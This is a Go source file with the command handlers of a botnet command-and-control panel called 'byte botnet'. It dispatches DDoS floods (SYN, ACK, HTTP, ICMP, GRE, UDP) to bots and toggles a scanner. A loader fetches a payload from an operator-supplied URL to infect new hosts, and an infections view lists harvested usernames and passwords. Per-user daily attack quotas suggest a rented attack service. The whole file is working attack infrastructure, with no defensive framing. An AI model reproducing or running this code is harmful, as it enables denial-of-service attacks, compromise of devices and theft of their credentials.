package handlers

import (
	"cnc/internal/config"
	"cnc/internal/loader"
	"cnc/internal/logger"
	"cnc/internal/models"
	"cnc/internal/state"
	"cnc/internal/ui"
	"cnc/internal/util"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const MAX_COMMAND_LENGTH = 2048

func ProcessCommand(user *models.User, command string, conn net.Conn, userIP string) string {
	if len(command) == 0 {
		return ""
	}
	logger.LogCommand(user.User, userIP, command)

	cmdParts := strings.Fields(command)
	cmd := cmdParts[0]

	if isAttackCommand(cmd) {
		if !canUserAttack(user) {
			remaining := user.DailyLimit - user.DailyUsed
			return ui.RED + fmt.Sprintf("Daily attack limit exceeded! Remaining: %d\r\n", remaining) + ui.RESET
		}

		state.CooldownMutex.Lock()
		if state.GlobalCooldown > 0 {
			msg := fmt.Sprintf(ui.RED+"\rGlobal cooldown still active for "+ui.YELLOW+"%d seconds"+ui.RESET+"\n", state.GlobalCooldown)
			state.CooldownMutex.Unlock()
			return msg
		}
		state.CooldownMutex.Unlock()

		incrementDailyUsed(user)
	}

	switch {
	case cmd == "!help":
		return handleHelpCommand()
	case cmd == "!admin":
		return HandleAdminCommand(user)
	case cmd == "!methods":
		return handleAttackListCommand()
	case cmd == "!bots":
		return handleBotsCommand()
	case cmd == "!dumpbots":
		Handle_botdump_command(user, conn)
		return ""
	case cmd == "!clear":
		handleClearCommand(conn)
		return ""
	case cmd == "!kickbots":
		HandleKickbotsCommand(user, command, conn)
		return ""
	case cmd == "!exit":
		conn.Close()
		return ""
	case cmd == "!stopall":
		handleStopAllCommand(user, conn)
		return ""
	case cmd == "!user":
		return handleUserCommand(user, command)
	case cmd == "!adduser":
		HandleAddUserCommand(user, conn)
		return ""
	case cmd == "!removeuser":
		HandleRemoveUserCommand(user, command, conn)
		return ""
	case cmd == "!kickuser":
		HandleKickUserCommand(user, command, conn)
		return ""
	case cmd == "!scan":
		return handleScanCommand(user, command, conn)
	case cmd == "!loader":
		return handleLoaderCommand(user, command, conn)
	case cmd == "!infections":
		return handleInfectionsCommand(user)
	case cmd == "!icmp" || cmd == "!gre":
		HandleLayer3AttackCommand(user, command, conn)
		return ""
	case isAttackCommand(cmd):
		HandleAttackCommand(user, command, conn)
		return ""
	default:
		return ui.RED + "\rCommand not found\n" + ui.RESET
	}
}

func handleHelpCommand() string {
	response := "\033[8;24;80t" + ui.CLEAR + ui.GREY2 + "\n Commands:\r\n" +
		ui.GREY2 + "  !methods    " + ui.WHITE + ":" + ui.GREY + " shows attack methods" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !admin      " + ui.WHITE + ":" + ui.GREY + " show admin and root commands" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !help       " + ui.WHITE + ":" + ui.GREY + " shows this msg" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !stopall    " + ui.WHITE + ":" + ui.GREY + " stops all atks" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !bots       " + ui.WHITE + ":" + ui.GREY + " list bots" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !user       " + ui.WHITE + ":" + ui.GREY + " show user or other users" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !scan       " + ui.WHITE + ":" + ui.GREY + " scanner control (admin)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !loader     " + ui.WHITE + ":" + ui.GREY + " loader control (admin)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !infections " + ui.WHITE + ":" + ui.GREY + " recent infection reports (admin)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !clear      " + ui.WHITE + ":" + ui.GREY + " clear screen" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !exit       " + ui.WHITE + ":" + ui.GREY + " leave CNC\r\n" + ui.RESET
	return response
}

func handleAttackListCommand() string {
	response := ui.CLEAR + "\033[8;24;100t" +
		ui.GREY2 + "\n Methods:\r\n" +
		ui.GREY2 + "  !syn       " + ui.WHITE + ":" + ui.GREY + " Fires TCP packets with SYN flag set (half-open requests)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !ack       " + ui.WHITE + ":" + ui.GREY + " Sends TCP packets with ACK flag set in bulk" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !http      " + ui.WHITE + ":" + ui.GREY + " Makes repeated HTTP GET requests with random user agents" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !icmp      " + ui.WHITE + ":" + ui.GREY + " Sends ICMP echo requests pings with payloads" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !gre       " + ui.WHITE + ":" + ui.GREY + " Builds GRE-encapsulated packets carrying TCP/UDP" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !udpcustom " + ui.WHITE + ":" + ui.GREY + " Crafts raw UDP packets with custom payload" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !udpplain  " + ui.WHITE + ":" + ui.GREY + " Sends large simple UDP datagrams quickly without extra headers" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "\n Optional Arguments:\r\n" +
		ui.GREY2 + "  psize      " + ui.WHITE + ":" + ui.GREY + " packet size (max: 64500-ICMP-UDP-SYN | 1450-UDPPLAIN | 8192-GRE)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  payload    " + ui.WHITE + ":" + ui.GREY + " Custom payload (0201024DFFFF0000DD00FFFF00FEFEFEFEFDFDFDFD12345678)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  srcport    " + ui.WHITE + ":" + ui.GREY + " srcport for UDP-SYN-GRE, Default=Random, max=65535)" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  botcount   " + ui.WHITE + ":" + ui.GREY + " Limit bots to use" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  proto      " + ui.WHITE + ":" + ui.GREY + " GRE Proto (tcp/udp) default=none" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  gport      " + ui.WHITE + ":" + ui.GREY + " destport for GRE" + ui.WHITE + ".\r\n\n" + ui.RESET
	return response
}

func handleClearCommand(conn net.Conn) {
	util.WriteToConn(conn, "\033[8;24;80t")
	util.WriteToConn(conn, "\033[H\033[J")
	conn.Write([]byte(ui.CLEAR + "\r\n\nWelcome to " + ui.WHITE + "byte botnet!\n\rBest Raw power, do what ever you want and enjoy!\r\n\n\n\n\n\n\n\n\n\n\n"))
}

func handleBotsCommand() string {
	archCounts := make(map[string]int)
	totalBots := 0

	state.BotMutex.Lock()
	uniqueIPs := make(map[string]bool)
	for i := 0; i < state.BotCount; i++ {
		if state.Bots[i].IsValid {
			if _, exists := uniqueIPs[state.Bots[i].Ip]; !exists {
				uniqueIPs[state.Bots[i].Ip] = true
				arch := state.Bots[i].Arch
				if arch == "" {
					arch = "unknown"
				}
				archCounts[arch]++
				totalBots++
			}
		}
	}
	state.BotMutex.Unlock()

	var response strings.Builder
	for arch, count := range archCounts {
		response.WriteString(fmt.Sprintf(ui.GREY2+"%s "+ui.WHITE+":"+ui.GREY+" %d\r\n"+ui.RESET, arch, count))
	}
	response.WriteString(fmt.Sprintf(ui.GREY2+"Total bots "+ui.WHITE+":"+ui.GREY+" %d\r\n"+ui.RESET, totalBots))
	return response.String()
}

func handleStopAllCommand(user *models.User, conn net.Conn) {
	allowStopAll := false
	if user.IsAdmin {
		allowStopAll = true
	} else {
		settings, err := config.ReadSettings()
		if err == nil && settings.GlobalStopAll {
			allowStopAll = true
		}
	}
	if !allowStopAll {
		util.WriteToConn(conn, ui.RED+"\rYou do not have permission to stop all attacks.\n"+ui.RESET)
		return
	}

	state.BotMutex.Lock()
	for i := 0; i < state.BotCount; i++ {
		if state.Bots[i].IsValid {
			state.Bots[i].Conn.Write([]byte("stop\n"))
		}
	}
	state.BotMutex.Unlock()

	state.UsersMutex.Lock()
	for i := 0; i < state.UserCount; i++ {
		state.Users[i].CurrentSlots = 0
	}
	state.UsersMutex.Unlock()

	state.CooldownMutex.Lock()
	state.CurrentGlobalSlots = 0
	state.CooldownMutex.Unlock()

	util.WriteToConn(conn, ui.GREEN+"\rAll attacks stopped and slots reset.\n"+ui.RESET)
}

func handleUserCommand(user *models.User, command string) string {
	parts := strings.Fields(command)
	found := false

	settings, _ := config.ReadSettings()
	isRoot := user.User == settings.RootUser

	if len(parts) == 1 {
		isAdminStr := "no"
		if user.IsAdmin {
			isAdminStr = "yes"
		}

		remainingAttacks := "unlimited"
		if user.DailyLimit > 0 {
			remainingAttacks = fmt.Sprintf("%d/%d", user.DailyUsed, user.DailyLimit)
		}

		response := fmt.Sprintf(ui.CLEAR+ui.GREY2+"Username      "+ui.WHITE+":"+ui.GREY+" %s\r\n"+
			ui.GREY2+"Max time      "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
			ui.GREY2+"Max bots      "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
			ui.GREY2+"Max slots     "+ui.WHITE+":"+ui.GREY+" %d (0 unlimited)\r\n"+
			ui.GREY2+"Current slots "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
			ui.GREY2+"Daily attacks "+ui.WHITE+":"+ui.GREY+" %s\r\n"+
			ui.GREY2+"Admin         "+ui.WHITE+":"+ui.GREY+" %s\r\n"+ui.RESET,
			user.User, user.MaxTime, user.MaxBots, user.MaxSlots, user.CurrentSlots, remainingAttacks, isAdminStr)
		return response // คืนค่า
	} else if len(parts) == 2 && (user.IsAdmin || isRoot) {
		targetUser := parts[1]
		state.UsersMutex.Lock()
		for i := 0; i < state.UserCount; i++ {
			if state.Users[i].User == targetUser {
				isAdminStr := "no"
				if state.Users[i].IsAdmin {
					isAdminStr = "yes"
				}
				isConnectedStr := "no"
				if state.Users[i].IsLoggedIn {
					isConnectedStr = "yes"
				}

				remainingAttacks := "unlimited"
				if state.Users[i].DailyLimit > 0 {
					remainingAttacks = fmt.Sprintf("%d/%d", state.Users[i].DailyUsed, state.Users[i].DailyLimit)
				}

				response := fmt.Sprintf(ui.CLEAR+ui.GREY2+"Username      "+ui.WHITE+":"+ui.GREY+" %s\r\n"+
					ui.GREY2+"Max time      "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
					ui.GREY2+"Max bots      "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
					ui.GREY2+"Max slots     "+ui.WHITE+":"+ui.GREY+" %d (0 unlimited)\r\n"+
					ui.GREY2+"Current slots "+ui.WHITE+":"+ui.GREY+" %d\r\n"+
					ui.GREY2+"Daily attacks "+ui.WHITE+":"+ui.GREY+" %s\r\n"+
					ui.GREY2+"Admin         "+ui.WHITE+":"+ui.GREY+" %s\r\n"+
					ui.GREY2+"Connected     "+ui.WHITE+":"+ui.GREY+" %s\r\n"+ui.RESET,
					state.Users[i].User, state.Users[i].MaxTime, state.Users[i].MaxBots, state.Users[i].MaxSlots, state.Users[i].CurrentSlots, remainingAttacks, isAdminStr, isConnectedStr)
				found = true
				state.UsersMutex.Unlock()
				return response
			}
		}
		state.UsersMutex.Unlock()
	}

	if !found {
		return ui.RED + "User not found\r\n" + ui.RESET
	}
	return ""
}

func checkAndResetDailyLimit(user *models.User) {
	today := time.Now().Format("2006-01-02")

	if user.LastResetDate != today {
		user.DailyUsed = 0
		user.LastResetDate = today
		saveUserDailyLimit(user)
	}
}

func saveUserDailyLimit(user *models.User) {
	file, err := os.ReadFile("database/logins.json")
	if err != nil {
		return
	}

	var allUsers []models.User
	if err := json.Unmarshal(file, &allUsers); err != nil {
		return
	}

	for i, u := range allUsers {
		if u.User == user.User {
			allUsers[i].DailyUsed = user.DailyUsed
			allUsers[i].LastResetDate = user.LastResetDate
			break
		}
	}

	updatedData, err := json.MarshalIndent(allUsers, "", "  ")
	if err != nil {
		return
	}

	os.WriteFile("database/logins.json", updatedData, 0644)
}

func canUserAttack(user *models.User) bool {
	checkAndResetDailyLimit(user)

	if user.DailyLimit == 0 {
		return true
	}

	return user.DailyUsed < user.DailyLimit
}

func incrementDailyUsed(user *models.User) {
	user.DailyUsed++
	saveUserDailyLimit(user)
}

/* ── Scanner & Loader Commands ── */

func handleScanCommand(user *models.User, command string, conn net.Conn) string {
	if !user.IsAdmin {
		return ui.RED + "\rAdmin only command\n" + ui.RESET
	}

	parts := strings.Fields(command)
	if len(parts) < 2 {
		return ui.GREY2 + "\n Scanner:\r\n" +
			ui.GREY2 + "  !scan on    " + ui.WHITE + ":" + ui.GREY + " start scanning on all bots\r\n" +
			ui.GREY2 + "  !scan off   " + ui.WHITE + ":" + ui.GREY + " stop scanning on all bots\r\n" +
			ui.GREY2 + "  !scan status" + ui.WHITE + ":" + ui.GREY + " show scanner/loader statistics\r\n" + ui.RESET
	}

	switch parts[1] {
	case "on":
		state.BotMutex.Lock()
		sent := 0
		for i := 0; i < state.BotCount; i++ {
			if state.Bots[i].IsValid {
				state.Bots[i].Conn.Write([]byte("scan_on"))
				sent++
			}
		}
		state.BotMutex.Unlock()
		return fmt.Sprintf(ui.GREEN+"\rScanner enabled on %d bots\n"+ui.RESET, sent)

	case "off":
		state.BotMutex.Lock()
		sent := 0
		for i := 0; i < state.BotCount; i++ {
			if state.Bots[i].IsValid {
				state.Bots[i].Conn.Write([]byte("scan_off"))
				sent++
			}
		}
		state.BotMutex.Unlock()
		return fmt.Sprintf(ui.YELLOW+"\rScanner disabled on %d bots\n"+ui.RESET, sent)

	case "status":
		s := loader.GetStats()
		running := "OFF"
		if loader.IsRunning() {
			running = ui.GREEN + "ON" + ui.RESET
		}
		return fmt.Sprintf(
			ui.GREY2+"\n Scanner/Loader Status:\r\n"+
				ui.GREY2+"  Loader        "+ui.WHITE+": "+ui.GREY+"%s\r\n"+
				ui.GREY2+"  Reports       "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Queue         "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Active workers"+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Attempts      "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Success       "+ui.WHITE+": "+ui.GREEN+"%d\r\n"+
				ui.GREY2+"  Failed        "+ui.WHITE+": "+ui.RED+"%d\r\n"+ui.RESET,
			running, s.TotalReports, s.QueueSize, s.ActiveLoaders,
			s.TotalAttempts, s.TotalSuccess, s.TotalFailed)

	default:
		return ui.RED + "\rUsage: !scan <on|off|status>\n" + ui.RESET
	}
}

func handleLoaderCommand(user *models.User, command string, conn net.Conn) string {
	if !user.IsAdmin {
		return ui.RED + "\rAdmin only command\n" + ui.RESET
	}

	parts := strings.Fields(command)
	if len(parts) < 2 {
		return ui.GREY2 + "\n Loader:\r\n" +
			ui.GREY2 + "  !loader on <payload_url>  " + ui.WHITE + ":" + ui.GREY + " start loader with payload base URL\r\n" +
			ui.GREY2 + "  !loader off              " + ui.WHITE + ":" + ui.GREY + " stop loader\r\n" +
			ui.GREY2 + "  !loader status           " + ui.WHITE + ":" + ui.GREY + " show loader status\r\n" + ui.RESET
	}

	switch parts[1] {
	case "on":
		if len(parts) < 3 {
			return ui.RED + "\rUsage: !loader on <http://your-ip>\n" + ui.RESET
		}
		payloadURL := parts[2]
		loader.Start(payloadURL)
		return fmt.Sprintf(ui.GREEN+"\rLoader started with payload: %s\n"+ui.RESET, payloadURL)

	case "off":
		loader.Stop()
		return ui.YELLOW + "\rLoader stopped\n" + ui.RESET

	case "status":
		s := loader.GetStats()
		running := ui.RED + "OFF" + ui.RESET
		if loader.IsRunning() {
			running = ui.GREEN + "ON" + ui.RESET
		}
		return fmt.Sprintf(
			ui.GREY2+"\n Loader Status:\r\n"+
				ui.GREY2+"  Status  "+ui.WHITE+": "+"%s\r\n"+
				ui.GREY2+"  Queue   "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Workers "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
				ui.GREY2+"  Success "+ui.WHITE+": "+ui.GREEN+"%d\r\n"+
				ui.GREY2+"  Failed  "+ui.WHITE+": "+ui.RED+"%d\r\n"+ui.RESET,
			running, s.QueueSize, s.ActiveLoaders, s.TotalSuccess, s.TotalFailed)

	default:
		return ui.RED + "\rUsage: !loader <on|off|status>\n" + ui.RESET
	}
}

func handleInfectionsCommand(user *models.User) string {
	if !user.IsAdmin {
		return ui.RED + "\rAdmin only command\n" + ui.RESET
	}

	creds := loader.GetRecentCredentials(20)
	if len(creds) == 0 {
		return ui.YELLOW + "\rNo infection reports yet\n" + ui.RESET
	}

	var sb strings.Builder
	sb.WriteString(ui.GREY2 + "\n Recent Infections:\r\n")

	for _, c := range creds {
		statusColor := ui.GREY
		switch c.Status {
		case "success":
			statusColor = ui.GREEN
		case "failed":
			statusColor = ui.RED
		case "loading":
			statusColor = ui.YELLOW
		}

		sb.WriteString(fmt.Sprintf(
			ui.GREY2+"  %s"+ui.WHITE+":"+ui.GREY+"%s  "+ui.GREY2+"%s/%s  "+statusColor+"[%s]"+ui.GREY+"  %s\r\n",
			c.IP, c.Port, c.Username, c.Password, c.Status,
			c.ReportedAt.Format("15:04:05")))
	}
	sb.WriteString(ui.RESET)
	return sb.String()
}